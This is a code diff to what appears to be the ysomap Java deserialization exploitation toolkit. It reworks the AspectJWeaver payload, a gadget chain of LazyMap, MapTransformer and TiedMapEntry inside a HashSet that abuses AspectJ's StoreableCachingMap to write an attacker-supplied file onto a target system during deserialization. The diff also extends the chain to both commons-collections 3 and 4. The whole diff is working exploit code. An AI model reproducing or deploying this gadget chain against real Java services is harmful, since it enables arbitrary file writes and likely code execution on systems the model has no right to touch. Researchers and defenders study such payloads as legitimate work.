@@ -1,8 +1,5 @@
 package ysomap.payloads.java.aspectjweaver;
 
-import org.apache.commons.collections.Transformer;
-import org.apache.commons.collections.keyvalue.TiedMapEntry;
-import org.apache.commons.collections.map.LazyMap;
 import ysomap.bullets.Bullet;
 import ysomap.bullets.aspectjweaver.StoreableCachingMapBullet;
 import ysomap.common.annotation.*;
@@ -40,6 +37,11 @@ import java.util.Map;
 @Dependencies({"org.aspectj:aspectjweaver:1.9.2", "commons-collections:commons-collections:3.2.2"})
 public class AspectJWeaver extends AbstractPayload<Object> {
 
+    private Class transformerClazz;
+    private Class mapTransformerClazz;
+    private Class lazyMapClazz;
+    private Class entryClazz;
+
     @Override
     public Bullet getDefaultBullet(Object... args) throws Exception {
         return StoreableCachingMapBullet.newInstance(args);
@@ -48,16 +50,20 @@ public class AspectJWeaver extends AbstractPayload<Object> {
     @Override
     public Object pack(Object obj) throws Exception {
         try {
+            initClazz(bullet.get("ccVersion"));
             byte[] content = FileHelper.getFileContent(bullet.get("localFilepath"));
             String filename = bullet.get("filename");
             Map map = new HashMap();
             map.put(filename, content);
-            Transformer transformer = (Transformer)ReflectionHelper
-                    .newInstance("org.apache.commons.collections.functors.MapTransformer",
+            Object transformer = ReflectionHelper.newInstance(mapTransformerClazz,
                             new Class[]{Map.class},
                             new Object[]{map});
-            Map lazyMap = LazyMap.decorate((Map)obj, transformer);
-            TiedMapEntry entry = new TiedMapEntry(lazyMap, filename);
+            Map lazyMap = (Map) ReflectionHelper.newInstance(lazyMapClazz,
+                            new Class[]{Map.class, transformerClazz},
+                            obj, transformer
+                    );
+
+            Object entry = makeEntry(lazyMap, filename);
 
             return PayloadHelper.makeHashSetWithEntry(entry);
         }catch (FileNotFoundException e){
@@ -67,4 +73,28 @@ public class AspectJWeaver extends AbstractPayload<Object> {
         return null;
     }
 
+    public Object makeEntry(Map map, String filename) throws Exception {
+        Object entry = ReflectionHelper.createWithoutConstructor(entryClazz);
+        ReflectionHelper.setFieldValue(entry, "map", map);
+        ReflectionHelper.setFieldValue(entry, "key", filename);
+        return entry;
+    }
+
+    public void initClazz(String version) {
+        try{
+            if(version.equals("3")){
+                transformerClazz = Class.forName("org.apache.commons.collections.Transformer");
+                mapTransformerClazz = Class.forName("org.apache.commons.collections.functors.MapTransformer");
+                lazyMapClazz = Class.forName("org.apache.commons.collections.map.LazyMap");
+                entryClazz = Class.forName("org.apache.commons.collections.keyvalue.TiedMapEntry");
+            }else{
+                transformerClazz = Class.forName("org.apache.commons.collections4.Transformer");
+                mapTransformerClazz = Class.forName("org.apache.commons.collections4.functors.MapTransformer");
+                lazyMapClazz = Class.forName("org.apache.commons.collections4.map.LazyMap");
+                entryClazz = Class.forName("org.apache.commons.collections4.keyvalue.TiedMapEntry");
+            }
+        }catch(ClassNotFoundException e){
+            e.printStackTrace();
+        }
+    }
 }
